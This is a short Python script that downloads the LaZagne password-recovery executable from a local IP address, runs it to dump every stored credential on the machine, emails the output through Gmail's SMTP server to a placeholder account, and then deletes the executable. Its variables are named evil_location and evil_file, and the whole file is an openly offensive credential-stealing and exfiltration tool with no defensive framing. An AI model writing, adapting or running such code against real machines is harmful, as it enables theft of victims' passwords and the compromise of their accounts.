import requests
import subprocess
import smtplib
import ssl
import tempfile
import os
from email.mime.text import MIMEText


def download(url, file_location):
    response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(f'{file_location}{file_name}', 'wb') as f:
        f.write(response.content)


def send_mail(from_addr, from_addr_password, to_addr, command):

    result = subprocess.check_output(command, shell=True)

    def send_email_via_gmail_smtp_service_use_smtplib(content, from_addr, from_addr_password, to_addr):
        # create MIMEText object which represent the email message.
        msg = MIMEText(content, 'plain', 'utf-8')
        # set email message from, to and subject attribute value.
        msg['From'] = from_addr
        msg['To'] = to_addr
        msg['Subject'] = 'Email sent through gmail smtp server.'

        # create a ssl context object because gmail need ssl access.
        ctx = ssl.create_default_context(
            ssl.Purpose.SERVER_AUTH, cafile=None, capath=None, cadata=None)
        # start ssl encryption from very beginning.
        # print('starting connect gmail smtp server with ssl.')
        # smtp_server = smtplib.SMTP_SSL('smtp.gmail.com', 465, context=ctx)
        # create SMTP connection object.
        smtp_server = smtplib.SMTP('smtp.gmail.com', 587)
        # start tls to make the connection secure.
        smtp_server.starttls(context=ctx)
        # print('start login gmail smtp server.')
        smtp_server.login(from_addr, from_addr_password)
        # print('start send message through gmail service.')
        smtp_server.send_message(msg, from_addr, to_addr)
        # print('Send email by python smtplib module through gmail smtp service complete.')

    send_email_via_gmail_smtp_service_use_smtplib(
        result, from_addr, from_addr_password, to_addr)


if __name__ == '__main__':
    evil_location = 'z:/'
    # evil_location = tempfile.gettempdir()
    os.chdir(evil_location)

    evil_file = 'lazagne.exe'
    download(f'http://192.168.1.100/evil_files/{evil_file}', evil_location)
    command = f'.\{evil_file} all'
   
    send_mail("fake@gmail.com", "feign",
              "fake@gmail.com", command)
    os.remove(evil_file)
